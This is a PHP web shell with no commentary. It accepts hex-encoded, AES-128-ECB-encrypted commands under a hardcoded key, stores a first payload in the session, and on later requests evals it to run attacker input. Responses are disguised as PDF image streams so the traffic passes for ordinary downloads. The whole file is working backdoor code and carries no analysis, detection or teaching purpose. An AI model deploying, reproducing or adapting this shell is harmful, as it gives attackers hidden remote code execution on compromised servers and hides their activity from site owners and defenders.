<?php
@session_start();
@set_time_limit(0);
@error_reporting(0);



function aes128($data,$mode){$result="";$blocksize=16;$key=base64_decode("gB2QhwWSDHIX2UT7rJjlhA==");if($mode==1){$pad=$blocksize -(strlen($data)% $blocksize);$data .=str_repeat(chr($pad), $pad);}if(function_exists("openssl_encrypt")){if($mode==1){$result=openssl_encrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}else{$result=openssl_decrypt($data,"AES-128-ECB",$key,OPENSSL_RAW_DATA|OPENSSL_ZERO_PADDING);}}else if(function_exists("mcrypt_encrypt")){if($mode==1){$result=mcrypt_encrypt("rijndael-128", $key, $data, "ecb", "");}else{$result=mcrypt_decrypt("rijndael-128", $key, $data, "ecb", "");}}if($mode==2){$pad=ord($result[strlen($result)-1]);if($pad > strlen($result))return false;if(strspn($result, chr($pad), strlen($result)- $pad)!=$pad)return false;$result=substr($result, 0, -1 * $pad);}return $result;}function pdfEncode($data){$z=gzcompress($data);$w=64+mt_rand(0,63);$h=max(1,intval(ceil(strlen($data)/$w)));$out="%PDF-1.4\n";$out.="%".dechex(mt_rand())."\n";$out.="1 0 obj\n";$out.="<< /Type /XObject /Subtype /Image /Width ".$w." /Height ".$h." /ColorSpace /DeviceGray /BitsPerComponent 8 /Filter /FlateDecode /Length ".strlen($z)." >>\n";$out.="stream\n";$out.=$z;$out.="\nendstream\nendobj\n";$off1=strlen($out);$out.="2 0 obj\n";$out.="<< /Type /Page /Parent 3 0 R /MediaBox [0 0 ".$w." ".$h."] /Resources << /XObject << /Im0 1 0 R >> >> /Contents 4 0 R >>\n";$out.="endobj\n";$off2=strlen($out);$out.="3 0 obj\n<< /Type /Pages /Kids [2 0 R] /Count 1 >>\nendobj\n";$off3=strlen($out);$out.="4 0 obj\n<< /Length 0 >>\nstream\n\nendstream\nendobj\n";$off4=strlen($out);$out.="5 0 obj\n<< /Type /Catalog /Pages 3 0 R >>\nendobj\n";$off5=strlen($out);$xrefOff=strlen($out);$out.="xref\n0 6\n0000000000 65535 f \n";foreach(array($off1,$off2,$off3,$off4,$off5) as $o){$out.=sprintf("%010d 00000 n \n",$o);}$out.="trailer\n<< /Size 6 /Root 5 0 R >>\nstartxref\n".$xrefOff."\n%%EOF";return $out;}







$requestData = file_get_contents("php://input");
if($requestData !== false && strlen($requestData) > 0){
    $requestData = pack("H*",$requestData);$requestData = aes128($requestData, 2);
    $payloadName="LW9I5d";
    if (isset($_SESSION[$payloadName])){
        $payload=base64_decode($_SESSION[$payloadName]);
        eval($payload);
        $responseData = @run($requestData);
        $responseData = base64_encode($responseData);$responseData=pdfEncode($responseData);
        header("HTTP/1.1 200 OK");header("Content-Type: application/pdf");echo $responseData;
    }else{
        $_SESSION[$payloadName] = base64_encode($requestData);
    }
}
